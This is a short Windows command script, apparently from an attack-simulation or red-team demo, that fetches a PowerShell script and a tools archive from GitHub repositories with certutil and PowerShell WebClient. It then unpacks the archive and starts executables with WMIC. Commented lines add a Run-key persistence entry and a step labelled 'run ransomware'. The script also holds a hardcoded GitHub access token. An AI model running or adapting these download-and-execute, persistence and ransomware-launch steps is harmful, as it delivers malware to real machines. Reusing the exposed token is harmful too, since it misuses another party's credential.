cd C:\temp
#. download powershell from github to c:\temp
certutil -urlcache -split -f "https://raw.githubusercontent.com/tmmdemo/automate/master/work.ps1" "work.ps1"

#. add to startup
#REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Insurance Policy" /t REG_SZ /F /D "#{command_to_execute}"

#. download tools.zip from github
#certutil -urlcache -split -f "https://raw.githubusercontent.com/tmmdemo/thenothing/master/toolz.zip" "tools.zip"
#curl -H 'Authorization: token 92abff4c894cf8fd60f1b75404f4478399a349f0' -H 'Accept: application/vnd.github.v3.raw' -O -L https://api.github.com/repos/owner/repo/contents/path
#https://raw.githubusercontent.com/tmmdemo/demotools/master/tools-pro.zip?token=AJBI5CRBR6P6XVTZOC5BWQS5L3CMK
powershell -command { $cli = New-Object System.Net.WebClient; $cli.Headers['Authorization'] = 'token 92abff4c894cf8fd60f1b75404f4478399a349f0'; $cli.DownloadFile('https://raw.githubusercontent.com/tmmdemo/demotools/master/tools-pro.zip', 'C:\temp\tools-pro.zip') }

#. extract tools-pro.zip
powershell.exe -nologo -noprofile -command "& { Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('tools-pro.zip', '.'); }"

#. 7z extract r.zip
#.\7z x r.zip * -pinfected -y

#. run ransomware
#WMIC process call create "C:\temp\ransomware.exe"
WMIC process call create "C:\temp\notr.exe"
